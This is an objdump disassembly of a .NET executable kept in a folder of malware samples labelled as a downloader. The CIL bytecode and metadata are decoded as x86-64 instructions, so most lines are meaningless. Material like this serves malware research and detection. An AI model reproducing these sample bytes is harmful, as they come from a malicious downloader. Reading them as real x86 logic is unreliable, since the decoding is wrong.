
malware_samples/downloader/ce830f802b7fdb4d42c18bd692690cfac0e2d03947c6b13f583af215a7039b54.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140002000 <.text>:
   140002000:	48 00 00             	rex.W add %al,(%rax)
   140002003:	00 02                	add    %al,(%rdx)
   140002005:	00 05 00 20 24 00    	add    %al,0x242000(%rip)        # 0x14024400b
   14000200b:	00 84 13 00 00 01 00 	add    %al,0x10000(%rbx,%rdx,1)
   140002012:	00 00                	add    %al,(%rax)
   140002014:	01 00                	add    %eax,(%rax)
   140002016:	00 06                	add    %al,(%rsi)
   140002018:	a4                   	movsb  (%rsi),(%rdi)
   140002019:	37                   	(bad)
   14000201a:	00 00                	add    %al,(%rax)
   14000201c:	b8 00 00 00 00       	mov    $0x0,%eax
	...
   140002045:	00 00                	add    %al,(%rax)
   140002047:	00 22                	add    %ah,(%rdx)
   140002049:	00 73 0c             	add    %dh,0xc(%rbx)
   14000204c:	00 00                	add    %al,(%rax)
   14000204e:	06                   	(bad)
   14000204f:	26 2a 22             	es sub (%rdx),%ah
   140002052:	02 28                	add    (%rax),%ch
   140002054:	14 00                	adc    $0x0,%al
   140002056:	00 0a                	add    %cl,(%rdx)
   140002058:	00 2a                	add    %ch,(%rdx)
   14000205a:	00 00                	add    %al,(%rax)
   14000205c:	13 30                	adc    (%rax),%esi
   14000205e:	02 00                	add    (%rax),%al
   140002060:	2b 00                	sub    (%rax),%eax
   140002062:	00 00                	add    %al,(%rax)
   140002064:	01 00                	add    %eax,(%rax)
   140002066:	00 11                	add    %dl,(%rcx)
   140002068:	00 03                	add    %al,(%rbx)
   14000206a:	2c 0b                	sub    $0xb,%al
   14000206c:	02 7b 01             	add    0x1(%rbx),%bh
   14000206f:	00 00                	add    %al,(%rax)
   140002071:	04 14                	add    $0x14,%al
   140002073:	fe 03                	incb   (%rbx)
   140002075:	2b 01                	sub    (%rcx),%eax
   140002077:	16                   	(bad)
   140002078:	0a 06                	or     (%rsi),%al
   14000207a:	2c 0e                	sub    $0xe,%al
   14000207c:	00 02                	add    %al,(%rdx)
   14000207e:	7b 01                	jnp    0x140002081
   140002080:	00 00                	add    %al,(%rax)
   140002082:	04 6f                	add    $0x6f,%al
   140002084:	15 00 00 0a 00       	adc    $0xa0000,%eax
   140002089:	00 02                	add    %al,(%rdx)
   14000208b:	03 28                	add    (%rax),%ebp
   14000208d:	16                   	(bad)
   14000208e:	00 00                	add    %al,(%rax)
   140002090:	0a 00                	or     (%rax),%al
   140002092:	2a de                	sub    %dh,%bl
   140002094:	00 02                	add    %al,(%rdx)
   140002096:	73 17                	jae    0x1400020af
   140002098:	00 00                	add    %al,(%rax)
   14000209a:	0a 7d 01             	or     0x1(%rbp),%bh
   14000209d:	00 00                	add    %al,(%rax)
   14000209f:	04 02                	add    $0x2,%al
   1400020a1:	17                   	(bad)
   1400020a2:	28 18                	sub    %bl,(%rax)
   1400020a4:	00 00                	add    %al,(%rax)
   1400020a6:	0a 00                	or     (%rax),%al
   1400020a8:	02 20                	add    (%rax),%ah
   1400020aa:	20 03                	and    %al,(%rbx)
   1400020ac:	00 00                	add    %al,(%rax)
   1400020ae:	20 c2                	and    %al,%dl
   1400020b0:	01 00                	add    %eax,(%rax)
   1400020b2:	00 73 19             	add    %dh,0x19(%rbx)
   1400020b5:	00 00                	add    %al,(%rax)
   1400020b7:	0a 28                	or     (%rax),%ch
   1400020b9:	1a 00                	sbb    (%rax),%al
   1400020bb:	00 0a                	add    %cl,(%rdx)
   1400020bd:	00 02                	add    %al,(%rdx)
   1400020bf:	72 01                	jb     0x1400020c2
   1400020c1:	00 00                	add    %al,(%rax)
   1400020c3:	70 6f                	jo     0x140002134
   1400020c5:	1b 00                	sbb    (%rax),%eax
   1400020c7:	00 0a                	add    %cl,(%rdx)
   1400020c9:	00 2a                	add    %ch,(%rdx)
   1400020cb:	5e                   	pop    %rsi
   1400020cc:	02 14 7d 01 00 00 04 	add    0x4000001(,%rdi,2),%dl
   1400020d3:	02 28                	add    (%rax),%ch
   1400020d5:	1c 00                	sbb    $0x0,%al
   1400020d7:	00 0a                	add    %cl,(%rdx)
   1400020d9:	00 00                	add    %al,(%rax)
   1400020db:	02 28                	add    (%rax),%ch
   1400020dd:	04 00                	add    $0x0,%al
   1400020df:	00 06                	add    %al,(%rsi)
   1400020e1:	00 2a                	add    %ch,(%rdx)
   1400020e3:	00 13                	add    %dl,(%rbx)
   1400020e5:	30 03                	xor    %al,(%rbx)
   1400020e7:	00 61 00             	add    %ah,0x0(%rcx)
   1400020ea:	00 00                	add    %al,(%rax)
   1400020ec:	02 00                	add    (%rax),%al
   1400020ee:	00 11                	add    %dl,(%rcx)
   1400020f0:	00 03                	add    %al,(%rbx)
   1400020f2:	0a 73 1d             	or     0x1d(%rbx),%dh
   1400020f5:	00 00                	add    %al,(%rax)
   1400020f7:	0a 0b                	or     (%rbx),%cl
   1400020f9:	07                   	(bad)
   1400020fa:	6f                   	outsl  (%rsi),(%dx)
   1400020fb:	1e                   	(bad)
   1400020fc:	00 00                	add    %al,(%rax)
   1400020fe:	0a 72 0d             	or     0xd(%rdx),%dh
   140002101:	00 00                	add    %al,(%rax)
   140002103:	70 6f                	jo     0x140002174
   140002105:	1f                   	(bad)
   140002106:	00 00                	add    %al,(%rax)
   140002108:	0a 00                	or     (%rax),%al
   14000210a:	07                   	(bad)
   14000210b:	6f                   	outsl  (%rsi),(%dx)
   14000210c:	1e                   	(bad)
   14000210d:	00 00                	add    %al,(%rax)
   14000210f:	0a 72 15             	or     0x15(%rdx),%dh
   140002112:	00 00                	add    %al,(%rax)
   140002114:	70 6f                	jo     0x140002185
   140002116:	20 00                	and    %al,(%rax)
   140002118:	00 0a                	add    %cl,(%rdx)
   14000211a:	00 07                	add    %al,(%rdi)
   14000211c:	6f                   	outsl  (%rsi),(%dx)
   14000211d:	1e                   	(bad)
   14000211e:	00 00                	add    %al,(%rax)
   140002120:	0a 17                	or     (%rdi),%dl
   140002122:	6f                   	outsl  (%rsi),(%dx)
   140002123:	21 00                	and    %eax,(%rax)
   140002125:	00 0a                	add    %cl,(%rdx)
   140002127:	00 07                	add    %al,(%rdi)
   140002129:	6f                   	outsl  (%rsi),(%dx)
   14000212a:	22 00                	and    (%rax),%al
   14000212c:	00 0a                	add    %cl,(%rdx)
   14000212e:	26 2b 02             	es sub (%rdx),%eax
   140002131:	00 00                	add    %al,(%rax)
   140002133:	07                   	(bad)
   140002134:	6f                   	outsl  (%rsi),(%dx)
   140002135:	23 00                	and    (%rax),%eax
   140002137:	00 0a                	add    %cl,(%rdx)
   140002139:	16                   	(bad)
   14000213a:	fe 01                	incb   (%rcx)
   14000213c:	0c 08                	or     $0x8,%al
   14000213e:	2d f1 06 16 06       	sub    $0x61606f1,%eax
   140002143:	8e 69 28             	mov    0x28(%rcx),%gs
   140002146:	24 00                	and    $0x0,%al
   140002148:	00 0a                	add    %cl,(%rdx)
   14000214a:	00 06                	add    %al,(%rsi)
   14000214c:	0d 2b 00 09 2a       	or     $0x2a09002b,%eax
   140002151:	00 00                	add    %al,(%rax)
   140002153:	00 13                	add    %dl,(%rbx)
   140002155:	30 02                	xor    %al,(%rdx)
   140002157:	00 29                	add    %ch,(%rcx)
   140002159:	00 00                	add    %al,(%rax)
   14000215b:	00 03                	add    %al,(%rbx)
   14000215d:	00 00                	add    %al,(%rax)
   14000215f:	11 00                	adc    %eax,(%rax)
   140002161:	73 25                	jae    0x140002188
   140002163:	00 00                	add    %al,(%rax)
   140002165:	0a 0a                	or     (%rdx),%cl
   140002167:	02 03                	add    (%rbx),%al
   140002169:	28 08                	sub    %cl,(%rax)
   14000216b:	00 00                	add    %al,(%rax)
   14000216d:	06                   	(bad)
   14000216e:	06                   	(bad)
   14000216f:	6f                   	outsl  (%rsi),(%dx)
   140002170:	26 00 00             	es add %al,(%rax)
   140002173:	0a 00                	or     (%rax),%al
   140002175:	06                   	(bad)
   140002176:	6f                   	outsl  (%rsi),(%dx)
   140002177:	27                   	(bad)
   140002178:	00 00                	add    %al,(%rax)
   14000217a:	0a 0b                	or     (%rbx),%cl
   14000217c:	06                   	(bad)
   14000217d:	6f                   	outsl  (%rsi),(%dx)
   14000217e:	28 00                	sub    %al,(%rax)
   140002180:	00 0a                	add    %cl,(%rdx)
   140002182:	00 07                	add    %al,(%rdi)
   140002184:	0c 2b                	or     $0x2b,%al
   140002186:	00 08                	add    %cl,(%rax)
   140002188:	2a 00                	sub    (%rax),%al
   14000218a:	00 00                	add    %al,(%rax)
   14000218c:	1b 30                	sbb    (%rax),%esi
   14000218e:	01 00                	add    %eax,(%rax)
   140002190:	3a 00                	cmp    (%rax),%al
   140002192:	00 00                	add    %al,(%rax)
   140002194:	04 00                	add    $0x0,%al
   140002196:	00 11                	add    %dl,(%rcx)
   140002198:	00 00                	add    %al,(%rax)
   14000219a:	20 00                	and    %al,(%rax)
   14000219c:	0c 00                	or     $0x0,%al
   14000219e:	00 28                	add    %ch,(%rax)
   1400021a0:	29 00                	sub    %eax,(%rax)
   1400021a2:	00 0a                	add    %cl,(%rdx)
   1400021a4:	00 00                	add    %al,(%rax)
   1400021a6:	de 05 26 00 00 de    	fiadds -0x21ffffda(%rip)        # 0x11e0021d2
   1400021ac:	00 03                	add    %al,(%rbx)
   1400021ae:	28 2a                	sub    %ch,(%rdx)
   1400021b0:	00 00                	add    %al,(%rax)
   1400021b2:	0a 74 17 00          	or     0x0(%rdi,%rdx,1),%dh
   1400021b6:	00 01                	add    %al,(%rcx)
   1400021b8:	0a 06                	or     (%rsi),%al
   1400021ba:	6f                   	outsl  (%rsi),(%dx)
   1400021bb:	2b 00                	sub    (%rax),%eax
   1400021bd:	00 0a                	add    %cl,(%rdx)
   1400021bf:	74 18                	je     0x1400021d9
   1400021c1:	00 00                	add    %al,(%rax)
   1400021c3:	01 0b                	add    %ecx,(%rbx)
   1400021c5:	07                   	(bad)
   1400021c6:	6f                   	outsl  (%rsi),(%dx)
   1400021c7:	2c 00                	sub    $0x0,%al
   1400021c9:	00 0a                	add    %cl,(%rdx)
   1400021cb:	0c 08                	or     $0x8,%al
   1400021cd:	0d 2b 00 09 2a       	or     $0x2a09002b,%eax
   1400021d2:	00 00                	add    %al,(%rax)
   1400021d4:	01 10                	add    %edx,(%rax)
   1400021d6:	00 00                	add    %al,(%rax)
   1400021d8:	00 00                	add    %al,(%rax)
   1400021da:	01 00                	add    %eax,(%rax)
   1400021dc:	0f 10 00             	movups (%rax),%xmm0
   1400021df:	05 10 00 00 01       	add    $0x1000010,%eax
   1400021e4:	13 30                	adc    (%rax),%esi
   1400021e6:	03 00                	add    (%rax),%eax
   1400021e8:	1c 00                	sbb    $0x0,%al
   1400021ea:	00 00                	add    %al,(%rax)
   1400021ec:	05 00 00 11 00       	add    $0x110000,%eax
   1400021f1:	02 02                	add    (%rdx),%al
   1400021f3:	72 49                	jb     0x14000223e
   1400021f5:	00 00                	add    %al,(%rax)
   1400021f7:	70 28                	jo     0x140002221
   1400021f9:	07                   	(bad)
   1400021fa:	00 00                	add    %al,(%rax)
   1400021fc:	06                   	(bad)
   1400021fd:	28 06                	sub    %al,(%rsi)
   1400021ff:	00 00                	add    %al,(%rax)
   140002201:	06                   	(bad)
   140002202:	28 2d 00 00 0a 0a    	sub    %ch,0xa0a0000(%rip)        # 0x14a0a2208
   140002208:	2b 00                	sub    (%rax),%eax
   14000220a:	06                   	(bad)
   14000220b:	2a 13                	sub    (%rbx),%dl
   14000220d:	30 02                	xor    %al,(%rdx)
   14000220f:	00 2b                	add    %ch,(%rbx)
   140002211:	00 00                	add    %al,(%rax)
   140002213:	00 01                	add    %al,(%rcx)
   140002215:	00 00                	add    %al,(%rax)
   140002217:	11 00                	adc    %eax,(%rax)
   140002219:	03 2c 0b             	add    (%rbx,%rcx,1),%ebp
   14000221c:	02 7b 02             	add    0x2(%rbx),%bh
   14000221f:	00 00                	add    %al,(%rax)
   140002221:	04 14                	add    $0x14,%al
   140002223:	fe 03                	incb   (%rbx)
   140002225:	2b 01                	sub    (%rcx),%eax
   140002227:	16                   	(bad)
   140002228:	0a 06                	or     (%rsi),%al
   14000222a:	2c 0e                	sub    $0xe,%al
   14000222c:	00 02                	add    %al,(%rdx)
   14000222e:	7b 02                	jnp    0x140002232
   140002230:	00 00                	add    %al,(%rax)
   140002232:	04 6f                	add    $0x6f,%al
   140002234:	15 00 00 0a 00       	adc    $0xa0000,%eax
   140002239:	00 02                	add    %al,(%rdx)
   14000223b:	03 28                	add    (%rax),%ebp
   14000223d:	16                   	(bad)
   14000223e:	00 00                	add    %al,(%rax)
   140002240:	0a 00                	or     (%rax),%al
   140002242:	2a 00                	sub    (%rax),%al
   140002244:	13 30                	adc    (%rax),%esi
   140002246:	03 00                	add    (%rax),%eax
   140002248:	43 00 00             	rex.XB add %al,(%r8)
   14000224b:	00 00                	add    %al,(%rax)
   14000224d:	00 00                	add    %al,(%rax)
   14000224f:	00 00                	add    %al,(%rax)
   140002251:	02 73 17             	add    0x17(%rbx),%dh
   140002254:	00 00                	add    %al,(%rax)
   140002256:	0a 7d 02             	or     0x2(%rbp),%bh
   140002259:	00 00                	add    %al,(%rax)
   14000225b:	04 02                	add    $0x2,%al
   14000225d:	17                   	(bad)
   14000225e:	28 18                	sub    %bl,(%rax)
   140002260:	00 00                	add    %al,(%rax)
   140002262:	0a 00                	or     (%rax),%al
   140002264:	02 20                	add    (%rax),%ah
   140002266:	20 03                	and    %al,(%rbx)
   140002268:	00 00                	add    %al,(%rax)
   14000226a:	20 c2                	and    %al,%dl
   14000226c:	01 00                	add    %eax,(%rax)
   14000226e:	00 73 19             	add    %dh,0x19(%rbx)
   140002271:	00 00                	add    %al,(%rax)
   140002273:	0a 28                	or     (%rax),%ch
   140002275:	1a 00                	sbb    (%rax),%al
   140002277:	00 0a                	add    %cl,(%rdx)
   140002279:	00 02                	add    %al,(%rdx)
   14000227b:	72 bd                	jb     0x14000223a
   14000227d:	00 00                	add    %al,(%rax)
   14000227f:	70 6f                	jo     0x1400022f0
   140002281:	1b 00                	sbb    (%rax),%eax
   140002283:	00 0a                	add    %cl,(%rdx)
   140002285:	00 02                	add    %al,(%rdx)
   140002287:	72 f9                	jb     0x140002282
   140002289:	00 00                	add    %al,(%rax)
   14000228b:	70 28                	jo     0x1400022b5
   14000228d:	2e 00 00             	cs add %al,(%rax)
   140002290:	0a 00                	or     (%rax),%al
   140002292:	2a 7a 02             	sub    0x2(%rdx),%bh
   140002295:	14 7d                	adc    $0x7d,%al
   140002297:	02 00                	add    (%rax),%al
   140002299:	00 04 02             	add    %al,(%rdx,%rax,1)
   14000229c:	28 1c 00             	sub    %bl,(%rax,%rax,1)
   14000229f:	00 0a                	add    %cl,(%rdx)
   1400022a1:	00 00                	add    %al,(%rax)
   1400022a3:	02 28                	add    (%rax),%ch
   1400022a5:	0b 00                	or     (%rax),%eax
   1400022a7:	00 06                	add    %al,(%rsi)
   1400022a9:	00 02                	add    %al,(%rdx)
   1400022ab:	28 0d 00 00 06 00    	sub    %cl,0x60000(%rip)        # 0x1400622b1
   1400022b1:	2a 00                	sub    (%rax),%al
   1400022b3:	00 13                	add    %dl,(%rbx)
   1400022b5:	30 06                	xor    %al,(%rsi)
   1400022b7:	00 90 00 00 00 06    	add    %dl,0x6000000(%rax)
   1400022bd:	00 00                	add    %al,(%rax)
   1400022bf:	11 00                	adc    %eax,(%rax)
   1400022c1:	73 05                	jae    0x1400022c8
   1400022c3:	00 00                	add    %al,(%rax)
   1400022c5:	06                   	(bad)
   1400022c6:	28 09                	sub    %cl,(%rcx)
   1400022c8:	00 00                	add    %al,(%rax)
   1400022ca:	06                   	(bad)
   1400022cb:	0a 06                	or     (%rsi),%al
   1400022cd:	14 28                	adc    $0x28,%al
   1400022cf:	2f                   	(bad)
   1400022d0:	00 00                	add    %al,(%rax)
   1400022d2:	0a 0b                	or     (%rbx),%cl
   1400022d4:	07                   	(bad)
   1400022d5:	2c 06                	sub    $0x6,%al
   1400022d7:	73 30                	jae    0x140002309
   1400022d9:	00 00                	add    %al,(%rax)
   1400022db:	0a 7a 00             	or     0x0(%rdx),%bh
   1400022de:	06                   	(bad)
   1400022df:	6f                   	outsl  (%rsi),(%dx)
   1400022e0:	31 00                	xor    %eax,(%rax)
   1400022e2:	00 0a                	add    %cl,(%rdx)
   1400022e4:	02 fe                	add    %dh,%bh
   1400022e6:	06                   	(bad)
   1400022e7:	0e                   	(bad)
   1400022e8:	00 00                	add    %al,(%rax)
   1400022ea:	06                   	(bad)
   1400022eb:	73 32                	jae    0x14000231f
   1400022ed:	00 00                	add    %al,(%rax)
   1400022ef:	0a 28                	or     (%rax),%ch
   1400022f1:	01 00                	add    %eax,(%rax)
   1400022f3:	00 2b                	add    %ch,(%rbx)
   1400022f5:	0c 08                	or     $0x8,%al
   1400022f7:	14 28                	adc    $0x28,%al
   1400022f9:	34 00                	xor    $0x0,%al
   1400022fb:	00 0a                	add    %cl,(%rdx)
   1400022fd:	0d 09 2c 06 73       	or     $0x73062c09,%eax
   140002302:	30 00                	xor    %al,(%rax)
   140002304:	00 0a                	add    %cl,(%rdx)
   140002306:	7a 00                	jp     0x140002308
   140002308:	08 6f 35             	or     %ch,0x35(%rdi)
   14000230b:	00 00                	add    %al,(%rax)
   14000230d:	0a 02                	or     (%rdx),%al
   14000230f:	fe 06                	incb   (%rsi)
   140002311:	0f 00 00             	sldt   (%rax)
   140002314:	06                   	(bad)
   140002315:	73 36                	jae    0x14000234d
   140002317:	00 00                	add    %al,(%rax)
   140002319:	0a 28                	or     (%rax),%ch
   14000231b:	02 00                	add    (%rax),%al
   14000231d:	00 2b                	add    %ch,(%rbx)
   14000231f:	13 04 11             	adc    (%rcx,%rdx,1),%eax
   140002322:	04 14                	add    $0x14,%al
   140002324:	28 37                	sub    %dh,(%rdi)
   140002326:	00 00                	add    %al,(%rax)
   140002328:	0a 13                	or     (%rbx),%dl
   14000232a:	05 11 05 2c 06       	add    $0x62c0511,%eax
   14000232f:	73 30                	jae    0x140002361
   140002331:	00 00                	add    %al,(%rax)
   140002333:	0a 7a 00             	or     0x0(%rdx),%bh
   140002336:	08 11                	or     %dl,(%rcx)
   140002338:	04 6f                	add    $0x6f,%al
   14000233a:	38 00                	cmp    %al,(%rax)
   14000233c:	00 0a                	add    %cl,(%rdx)
   14000233e:	20 00                	and    %al,(%rax)
   140002340:	01 00                	add    %eax,(%rax)
   140002342:	00 14 14             	add    %dl,(%rsp,%rdx,1)
   140002345:	14 6f                	adc    $0x6f,%al
   140002347:	39 00                	cmp    %eax,(%rax)
   140002349:	00 0a                	add    %cl,(%rdx)
   14000234b:	26 00 00             	es add %al,(%rax)
   14000234e:	00 2a                	add    %ch,(%rdx)
   140002350:	4a 03 6f 3a          	rex.WX add 0x3a(%rdi),%rbp
   140002354:	00 00                	add    %al,(%rax)
   140002356:	0a 02                	or     (%rdx),%al
   140002358:	6f                   	outsl  (%rsi),(%dx)
   140002359:	3b 00                	cmp    (%rax),%eax
   14000235b:	00 0a                	add    %cl,(%rdx)
   14000235d:	28 3c 00             	sub    %bh,(%rax,%rax,1)
   140002360:	00 0a                	add    %cl,(%rdx)
   140002362:	2a 4a 03             	sub    0x3(%rdx),%cl
   140002365:	6f                   	outsl  (%rsi),(%dx)
   140002366:	38 00                	cmp    %al,(%rax)
   140002368:	00 0a                	add    %cl,(%rdx)
   14000236a:	02 28                	add    (%rax),%ch
   14000236c:	3d 00 00 0a 28       	cmp    $0x280a0000,%eax
   140002371:	3c 00                	cmp    $0x0,%al
   140002373:	00 0a                	add    %cl,(%rdx)
   140002375:	2a 26                	sub    (%rsi),%ah
   140002377:	02 28                	add    (%rax),%ch
   140002379:	14 00                	adc    $0x0,%al
   14000237b:	00 0a                	add    %cl,(%rdx)
   14000237d:	00 00                	add    %al,(%rax)
   14000237f:	2a 13                	sub    (%rbx),%dl
   140002381:	30 02                	xor    %al,(%rdx)
   140002383:	00 39                	add    %bh,(%rcx)
   140002385:	00 00                	add    %al,(%rax)
   140002387:	00 07                	add    %al,(%rdi)
   140002389:	00 00                	add    %al,(%rax)
   14000238b:	11 00                	adc    %eax,(%rax)
   14000238d:	7e 03                	jle    0x140002392
   14000238f:	00 00                	add    %al,(%rax)
   140002391:	04 14                	add    $0x14,%al
   140002393:	fe 01                	incb   (%rcx)
   140002395:	0a 06                	or     (%rsi),%al
   140002397:	2c 22                	sub    $0x22,%al
   140002399:	00 72 1f             	add    %dh,0x1f(%rdx)
   14000239c:	01 00                	add    %eax,(%rax)
   14000239e:	70 d0                	jo     0x140002370
   1400023a0:	05 00 00 02 28       	add    $0x28020000,%eax
   1400023a5:	3e 00 00             	ds add %al,(%rax)
   1400023a8:	0a 6f 3f             	or     0x3f(%rdi),%ch
   1400023ab:	00 00                	add    %al,(%rax)
   1400023ad:	0a 73 40             	or     0x40(%rbx),%dh
   1400023b0:	00 00                	add    %al,(%rax)
   1400023b2:	0a 0b                	or     (%rbx),%cl
   1400023b4:	07                   	(bad)
   1400023b5:	80 03 00             	addb   $0x0,(%rbx)
   1400023b8:	00 04 00             	add    %al,(%rax,%rax,1)
   1400023bb:	7e 03                	jle    0x1400023c0
   1400023bd:	00 00                	add    %al,(%rax)
   1400023bf:	04 0c                	add    $0xc,%al
   1400023c1:	2b 00                	sub    (%rax),%eax
   1400023c3:	08 2a                	or     %ch,(%rdx)
   1400023c5:	00 00                	add    %al,(%rax)
   1400023c7:	00 13                	add    %dl,(%rbx)
   1400023c9:	30 01                	xor    %al,(%rcx)
   1400023cb:	00 0b                	add    %cl,(%rbx)
   1400023cd:	00 00                	add    %al,(%rax)
   1400023cf:	00 08                	add    %cl,(%rax)
   1400023d1:	00 00                	add    %al,(%rax)
   1400023d3:	11 00                	adc    %eax,(%rax)
   1400023d5:	7e 04                	jle    0x1400023db
   1400023d7:	00 00                	add    %al,(%rax)
   1400023d9:	04 0a                	add    $0xa,%al
   1400023db:	2b 00                	sub    (%rax),%eax
   1400023dd:	06                   	(bad)
   1400023de:	2a 22                	sub    (%rdx),%ah
   1400023e0:	00 02                	add    %al,(%rdx)
   1400023e2:	80 04 00 00          	addb   $0x0,(%rax,%rax,1)
   1400023e6:	04 2a                	add    $0x2a,%al
   1400023e8:	13 30                	adc    (%rax),%esi
   1400023ea:	01 00                	add    %eax,(%rax)
   1400023ec:	0b 00                	or     (%rax),%eax
   1400023ee:	00 00                	add    %al,(%rax)
   1400023f0:	09 00                	or     %eax,(%rax)
   1400023f2:	00 11                	add    %dl,(%rcx)
   1400023f4:	00 7e 05             	add    %bh,0x5(%rsi)
   1400023f7:	00 00                	add    %al,(%rax)
   1400023f9:	04 0a                	add    $0xa,%al
   1400023fb:	2b 00                	sub    (%rax),%eax
   1400023fd:	06                   	(bad)
   1400023fe:	2a 22                	sub    (%rdx),%ah
   140002400:	02 28                	add    (%rax),%ch
   140002402:	41 00 00             	add    %al,(%r8)
   140002405:	0a 00                	or     (%rax),%al
   140002407:	2a 56 73             	sub    0x73(%rsi),%dl
   14000240a:	15 00 00 06 28       	adc    $0x28060000,%eax
   14000240f:	42 00 00             	rex.X add %al,(%rax)
   140002412:	0a 74 06 00          	or     0x0(%rsi,%rax,1),%dh
   140002416:	00 02                	add    %al,(%rdx)
   140002418:	80 05 00 00 04 2a 00 	addb   $0x0,0x2a040000(%rip)        # 0x16a04241f
   14000241f:	00 42 53             	add    %al,0x53(%rdx)
   140002422:	4a                   	rex.WX
   140002423:	42 01 00             	rex.X add %eax,(%rax)
   140002426:	01 00                	add    %eax,(%rax)
   140002428:	00 00                	add    %al,(%rax)
   14000242a:	00 00                	add    %al,(%rax)
   14000242c:	0c 00                	or     $0x0,%al
   14000242e:	00 00                	add    %al,(%rax)
   140002430:	76 34                	jbe    0x140002466
   140002432:	2e 30 2e             	cs xor %ch,(%rsi)
   140002435:	33 30                	xor    (%rax),%esi
   140002437:	33 31                	xor    (%rcx),%esi
   140002439:	39 00                	cmp    %eax,(%rax)
   14000243b:	00 00                	add    %al,(%rax)
   14000243d:	00 05 00 6c 00 00    	add    %al,0x6c00(%rip)        # 0x140009043
   140002443:	00 94 06 00 00 23 7e 	add    %dl,0x7e230000(%rsi,%rax,1)
   14000244a:	00 00                	add    %al,(%rax)
   14000244c:	00 07                	add    %al,(%rdi)
   14000244e:	00 00                	add    %al,(%rax)
   140002450:	80 07 00             	addb   $0x0,(%rdi)
   140002453:	00 23                	add    %ah,(%rbx)
   140002455:	53                   	push   %rbx
   140002456:	74 72                	je     0x1400024ca
   140002458:	69 6e 67 73 00 00 00 	imul   $0x73,0x67(%rsi),%ebp
   14000245f:	00 80 0e 00 00 58    	add    %al,0x5800000e(%rax)
   140002465:	01 00                	add    %eax,(%rax)
   140002467:	00 23                	add    %ah,(%rbx)
   140002469:	55                   	push   %rbp
   14000246a:	53                   	push   %rbx
   14000246b:	00 d8                	add    %bl,%al
   14000246d:	0f 00 00             	sldt   (%rax)
   140002470:	10 00                	adc    %al,(%rax)
   140002472:	00 00                	add    %al,(%rax)
   140002474:	23 47 55             	and    0x55(%rdi),%eax
   140002477:	49                   	rex.WB
   140002478:	44 00 00             	add    %r8b,(%rax)
   14000247b:	00 e8                	add    %ch,%al
   14000247d:	0f 00 00             	sldt   (%rax)
   140002480:	9c                   	pushf
   140002481:	03 00                	add    (%rax),%eax
   140002483:	00 23                	add    %ah,(%rbx)
   140002485:	42 6c                	rex.X insb (%dx),(%rdi)
   140002487:	6f                   	outsl  (%rsi),(%dx)
   140002488:	62                   	(bad)
   140002489:	00 00                	add    %al,(%rax)
   14000248b:	00 00                	add    %al,(%rax)
   14000248d:	00 00                	add    %al,(%rax)
   14000248f:	00 02                	add    %al,(%rdx)
   140002491:	00 00                	add    %al,(%rax)
   140002493:	01 57 15             	add    %edx,0x15(%rdi)
   140002496:	a2 09 09 09 00 00 00 	movabs %al,0x1fa000000090909
   14000249d:	fa 01 
   14000249f:	33 00                	xor    (%rax),%eax
   1400024a1:	16                   	(bad)
   1400024a2:	00 00                	add    %al,(%rax)
   1400024a4:	01 00                	add    %eax,(%rax)
   1400024a6:	00 00                	add    %al,(%rax)
   1400024a8:	3a 00                	cmp    (%rax),%al
   1400024aa:	00 00                	add    %al,(%rax)
   1400024ac:	06                   	(bad)
   1400024ad:	00 00                	add    %al,(%rax)
   1400024af:	00 05 00 00 00 16    	add    %al,0x16000000(%rip)        # 0x1560024b5
   1400024b5:	00 00                	add    %al,(%rax)
   1400024b7:	00 09                	add    %cl,(%rcx)
   1400024b9:	00 00                	add    %al,(%rax)
   1400024bb:	00 42 00             	add    %al,0x0(%rdx)
   1400024be:	00 00                	add    %al,(%rax)
   1400024c0:	18 00                	sbb    %al,(%rax)
   1400024c2:	00 00                	add    %al,(%rax)
   1400024c4:	09 00                	or     %eax,(%rax)
   1400024c6:	00 00                	add    %al,(%rax)
   1400024c8:	02 00                	add    (%rax),%al
   1400024ca:	00 00                	add    %al,(%rax)
   1400024cc:	03 00                	add    (%rax),%eax
   1400024ce:	00 00                	add    %al,(%rax)
   1400024d0:	04 00                	add    $0x0,%al
   1400024d2:	00 00                	add    %al,(%rax)
   1400024d4:	02 00                	add    (%rax),%al
   1400024d6:	00 00                	add    %al,(%rax)
   1400024d8:	01 00                	add    %eax,(%rax)
   1400024da:	00 00                	add    %al,(%rax)
   1400024dc:	05 00 00 00 01       	add    $0x1000000,%eax
   1400024e1:	00 00                	add    %al,(%rax)
   1400024e3:	00 02                	add    %al,(%rdx)
   1400024e5:	00 00                	add    %al,(%rax)
   1400024e7:	00 00                	add    %al,(%rax)
   1400024e9:	00 e0                	add    %ah,%al
   1400024eb:	03 01                	add    (%rcx),%eax
   1400024ed:	00 00                	add    %al,(%rax)
   1400024ef:	00 00                	add    %al,(%rax)
   1400024f1:	00 06                	add    %al,(%rsi)
   1400024f3:	00 4f 03             	add    %cl,0x3(%rdi)
   1400024f6:	0d 06 06 00 bc       	or     $0xbc000606,%eax
   1400024fb:	03 0d 06 06 00 6a    	add    0x6a000606(%rip),%ecx        # 0x1aa002b07
   140002501:	02 d0                	add    %al,%dl
   140002503:	05 0f 00 63 06       	add    $0x663000f,%eax
   140002508:	00 00                	add    %al,(%rax)
   14000250a:	06                   	(bad)
   14000250b:	00 ab 02 e0 04 06    	add    %ch,0x604e002(%rbx)
   140002511:	00 32                	add    %dh,(%rdx)
   140002513:	03 e0                	add    %eax,%esp
   140002515:	04 06                	add    $0x6,%al
   140002517:	00 13                	add    %dl,(%rbx)
   140002519:	03 e0                	add    %eax,%esp
   14000251b:	04 06                	add    $0x6,%al
   14000251d:	00 a3 03 e0 04 06    	add    %ah,0x604e003(%rbx)
   140002523:	00 6f 03             	add    %ch,0x3(%rdi)
   140002526:	e0 04                	loopne 0x14000252c
   140002528:	06                   	(bad)
   140002529:	00 88 03 e0 04 06    	add    %cl,0x604e003(%rax)
   14000252f:	00 c2                	add    %al,%dl
   140002531:	02 e0                	add    %al,%ah
   140002533:	04 06                	add    $0x6,%al
   140002535:	00 97 02 ee 05 06    	add    %dl,0x605ee02(%rdi)
   14000253b:	00 28                	add    %ch,(%rax)
   14000253d:	02 ee                	add    %dh,%ch
   14000253f:	05 06 00 f6 02       	add    $0x2f60006,%eax
   140002544:	e0 04                	loopne 0x14000254a
   140002546:	06                   	(bad)
   140002547:	00 dd                	add    %bl,%ch
   140002549:	02 f8                	add    %al,%bh
   14000254b:	03 06                	add    (%rsi),%eax
   14000254d:	00 e3                	add    %ah,%bl
   14000254f:	06                   	(bad)
   140002550:	99                   	cltd
   140002551:	04 06                	add    $0x6,%al
   140002553:	00 fa                	add    %bh,%dl
